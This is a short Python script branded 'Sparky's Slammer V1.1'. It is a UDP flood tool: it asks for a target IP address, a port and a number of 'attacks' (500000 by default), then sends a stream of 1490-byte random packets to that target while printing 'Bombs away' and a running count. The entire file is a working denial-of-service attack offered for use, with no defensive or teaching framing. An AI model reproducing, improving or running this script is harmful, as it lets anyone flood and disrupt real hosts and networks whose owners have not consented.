import os
import time
import socket
import random





s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet = random._urandom(1490)
sent = 0

print("   _____                  __        ")
print("  / ___/____  ____ ______/ /____  __")
print("  \__ \/ __ \/ __ `/ ___/ //_/ / / /")
print(" ___/ / /_/ / /_/ / /  / ,< / /_/ / ")
print("/____/ .___/\__,_/_/  /_/|_|\__, /  ")
print("    /_/                    /____/   ")
print("---------------------------------------------------------------------------")
print("Sparky's Slammer - V1.1 - Developed by Sparkzyboy")
print("---------------------------------------------------------------------------")
print()
print()
port = int(input("Port: "))
print()
print("---------------------------------------------------------------------------")
print()
ipp = input("IP Address:  ")
print()
print("---------------------------------------------------------------------------")
print()
slam = int(input("Attacks (default is 500000):  "))
print()
print("---------------------------------------------------------------------------")
print()
print("! FLODO WARNING !")
print("---------------------------------------------------------------------------")
print("Instructions: Open a new tab and wait")

if slam == 0:
    slam = 500000


for i in range(slam):
    s.sendto(packet,(ipp,port))
    sent += 1
    print("Bombs away - port", port," - ip", ipp , " - sending",sent,)

